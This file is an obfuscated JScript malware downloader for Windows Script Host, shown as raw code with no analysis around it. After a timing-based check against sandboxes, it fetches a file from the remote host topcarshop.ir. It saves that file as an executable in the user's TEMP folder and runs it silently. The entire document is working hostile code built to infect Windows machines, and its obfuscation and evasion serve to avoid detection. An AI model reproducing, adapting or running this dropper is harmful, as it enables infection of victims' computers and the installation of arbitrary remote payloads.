var _SD = false;
var _S = "CreateObject";
var _R0 = function _R() {return WScript[_S]("WScript"+".Shell");}(), _VW = 11;
var _I0 = "MSXML2.XMLHTTP";
var _M0 = 2123213;
var _O = 0;
function _C(_SP){_R0["Run"](_SP, _O, _O);};
function _X(){return _I0 + "";};
function _UP(_M1, _V){_O = _O * 1; return _M1 - _V;};
function _W(){return _S;};
/*@cc_on
  @if (@_win32 || @_win64)
    _SD = true;
  @end
@*/
if (_SD)
{
var _KQ = "";
function _TT(){return 22;};
var _RL = 0; var _Z = 0;
function _B()
{
var _IW = new this["Date"]();
var _B0 = _IW["getUTCMilliseconds"]();
WScript["Sleep"](_TT());
var _IW = new this["Date"]();
var _EW = _IW["getUTCMilliseconds"]();
WScript["Sleep"](_TT());
var _IW = new this["Date"]();
var _II = _IW["getUTCMilliseconds"]();
var _RL = "_M";
_RL = _UP(_EW, _B0);
var _Z = "_KW";
_Z = _UP(_II, _EW);
_KQ = "open";
return _UP(_RL, _Z);
}
var _X0 = false;
var _MO = false;
for (var _T = _O; _T < _TT() * 1; _T++){if (_B() != _O){
_X0 = true; 
_Z = "31" + 11 * _RL + _Z; 
_MO = true; 
break;
}}
function _H() {return ((_X0 == true) && (_X0 == _MO)) ? 1 : _O;};
if (_X0 && _H() && _MO){
function _TJ() {return _R0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "9axzZevxiDuS.ex" + "e";};
 _Q = _X();
 _FL = WScript[_S](_Q);
 var _I = 1;
 while (_I){
try {
	if (_I == 1)
	{
		_FL[_KQ]("GET", "http://topcarshop.ir/m1kas", false);
		_FL["send"]();
		_IH = "Sleep";
	}
	WScript[_IH](_TT() + 120); 
	if (_FL["readystate"] < 2 * 2) continue;
	_I = _O;
	function _CE(_TA) {var _D = (1, 2, 3, 4, 5, _TA); return _D;};
	_F0 = WScript[_W()]("ADODB.Stream");
	_Q = _F0;
	_Q[_KQ]();
	_Q["type"] = _CE(1);
	_Q["write"](_FL["ResponseBody"]);
	_F0["position"] = _CE(_O);
	_Q["Save" + "ToFile"](_TJ(), 2);
	_F0["cl"+"ose"]();
	_GK = _TJ();
	_C(_GK);
} catch(_F){};
}
}
}

